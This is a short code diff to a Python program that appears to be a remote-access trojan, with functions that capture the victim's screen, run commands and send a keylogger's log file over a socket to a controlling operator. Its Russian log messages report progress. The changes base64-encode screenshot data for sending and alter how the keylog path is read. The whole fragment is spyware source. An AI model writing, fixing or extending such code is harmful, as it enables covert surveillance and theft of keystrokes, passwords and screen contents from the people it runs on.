@@ -113,7 +113,8 @@ def screenshot(sock):
             screenshot_file = sct.shot(output="screenshot.png")
         with open(screenshot_file, "rb") as screen_file:
             logging.info("[+] Скриншот успешно создан")
-            reliable_send(screen_file.read(), sock)
+            data = base64.b64encode(screen_file.read()).decode()
+            reliable_send(data, sock)
     finally:
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
@@ -161,7 +162,7 @@ def execute_command(sock, command):
 
 def send_keylog_file(sock, keylogger):
     try:
-        keylogger_path = keylogger.path
+        keylogger_path = keylogger.get_path()
         if not os.path.exists(keylogger_path):
             reliable_send("[!!] Файл кейлогера отсутствует", sock)
             return
